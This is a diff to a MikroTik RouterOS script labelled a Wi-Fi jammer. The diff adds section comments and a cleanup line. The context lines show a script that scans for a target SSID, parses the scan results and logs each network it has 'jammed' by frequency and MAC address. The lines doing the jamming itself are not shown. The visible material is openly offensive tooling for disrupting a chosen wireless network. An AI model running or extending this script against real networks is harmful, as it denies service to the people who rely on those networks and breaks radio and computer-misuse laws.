@@ -1,7 +1,17 @@
+#-------------------------------------------------------------------------------
+# MikroTik RouterOS Wi-Fi Jammer
+#-------------------------------------------------------------------------------
+
+#-------------------------------------------------------------------------------
+# Settings
+#-------------------------------------------------------------------------------
 :local TARGETSSID "SomeSSID"
 :local WLANIFACE 0
 :local SCANDATFILENAME "scan.dat"
 
+#-------------------------------------------------------------------------------
+# Jammer
+#-------------------------------------------------------------------------------
 /interface wireless reset-configuration $WLANIFACE
 /interface wireless scan 0 duration=5 save-file=$SCANDATFILENAME
 :local text [/file get $SCANDATFILENAME contents]
@@ -24,3 +34,4 @@
     :log info "Jammed: $TARGETSSID $freq $mac"
   }
 } while ($startPos < $textLen)
+/file remove $SCANDATFILENAME
